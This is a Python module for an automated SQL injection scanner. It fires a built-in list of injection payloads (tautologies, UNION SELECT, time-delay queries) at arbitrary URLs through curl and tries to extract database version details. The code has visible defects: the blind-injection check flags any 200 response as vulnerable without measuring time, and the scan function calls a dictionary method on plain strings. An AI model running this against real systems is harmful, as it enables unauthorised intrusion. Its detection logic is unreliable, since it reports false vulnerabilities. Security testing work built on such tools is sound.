"""
SQL injection scanning module.
"""

import logging
import subprocess
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(5000000,MD5('A'))--",
    "1' WAITFOR DELAY '00:00:05'--",
]

ERROR_PATTERNS = [
    "sql syntax",
    "sql error",
    "mysql_fetch",
    "syntax error",
    "unterminated",
    "odbc_driver",
    "microsoftsql",
    "oracle",
    "postgresql",
    "sqlite",
    "mysql",
    "mariadb",
]


class SQLInjector:
    """SQL injection vulnerability scanner."""

    def __init__(self):
        self.payloads = SQLI_PAYLOADS
        self.error_patterns = ERROR_PATTERNS

    def test_parameter(
        self,
        url: str,
        param: str,
        method: str = "GET",
    ) -> Dict:
        """Test a parameter for SQL injection."""
        results = {
            "url": url,
            "parameter": param,
            "tests": [],
            "vulnerable": False,
            "error_based": False,
            "blind": False,
        }

        for payload in self.payloads[:8]:
            test_value = f"{param}={payload}"

            try:
                if method == "GET":
                    cmd = [
                        "curl", "-s", "-w", "\\n%{http_code}",
                        f"{url}?{test_value}",
                    ]
                else:
                    cmd = [
                        "curl", "-s", "-w", "\\n%{http_code}",
                        "-X", "POST", "-d", test_value,
                        url,
                    ]

                proc_result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )

                if proc_result.returncode == 0:
                    output = proc_result.stdout
                    lines = output.strip().split("\n")
                    status = int(lines[-1]) if lines else 0
                    body = "\n".join(lines[:-1]) if len(lines) > 1 else ""

                    has_error = any(
                        p.lower() in body.lower()
                        for p in self.error_patterns
                    )

                    is_different = status in [500, 200] and body

                    results["tests"].append({
                        "payload": payload,
                        "status": status,
                        "error_detected": has_error,
                        "response_length": len(body),
                    })

                    if has_error:
                        results["error_based"] = True
                        results["vulnerable"] = True

                    if "SLEEP" in payload or "BENCHMARK" in payload:
                        if status == 200 or len(body) > 100:
                            results["blind"] = True
                            results["vulnerable"] = True

            except Exception as e:
                logger.debug(f"Error testing {param}: {e}")

        return results

    def extract_schema(
        self,
        url: str,
        param: str,
    ) -> Dict:
        """Attempt schema extraction if vulnerable."""
        extraction_results = {
            "url": url,
            "version": None,
            "database": None,
            "users": [],
        }

        version_payloads = {
            "mysql": "1' AND 1=1 UNION SELECT @@version--",
            "postgres": "1' AND 1=1 UNION SELECT version()--",
            "mssql": "1' AND 1=1 UNION SELECT @@version--",
        }

        for db_type, payload in version_payloads.items():
            try:
                test_url = f"{url}?{param}={payload}"
                cmd = ["curl", "-s", test_url]

                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=15,
                )

                if result.returncode == 0:
                    if db_type in result.stdout.lower():
                        extraction_results["database"] = db_type
                        extraction_results["version"] = result.stdout[:200]

            except Exception:
                pass

        return extraction_results


class BlindSQLScanner:
    """Blind SQL injection testing."""

    def __init__(self):
        self.time_based_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
        ]

    async def test_time_based(
        self,
        url: str,
        param: str,
    ) -> Dict:
        """Test for time-based blind SQL injection."""
        results = {
            "url": url,
            "parameter": param,
            "vulnerable": False,
            "response_times": [],
        }

        import time
        for payload in self.time_based_payloads[:2]:
            try:
                test_url = f"{url}?{param}={payload}"
                cmd = ["curl", "-s", "-w", "%{time_total}", test_url]

                start = time.time()
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30,
                )
                elapsed = time.time() - start

                results["response_times"].append(elapsed)

                if elapsed >= 4.5:
                    results["vulnerable"] = True

            except Exception as e:
                logger.debug(f"Error in time-based test: {e}")

        return results


async def run_sqli_scan(
    target_id: str,
    endpoints: List[str],
) -> dict:
    """Run SQL injection scan on endpoints."""
    scanner = SQLInjector()

    all_results = []
    vulnerable_count = 0

    for endpoint in endpoints:
        url = endpoint.get("url", endpoint)
        param = endpoint.get("param", "id")

        result = scanner.test_parameter(url, param)
        all_results.append(result)

        if result.get("vulnerable"):
            vulnerable_count += 1

    return {
        "target_id": target_id,
        "total_endpoints": len(endpoints),
        "vulnerable": vulnerable_count,
        "results": all_results,
    }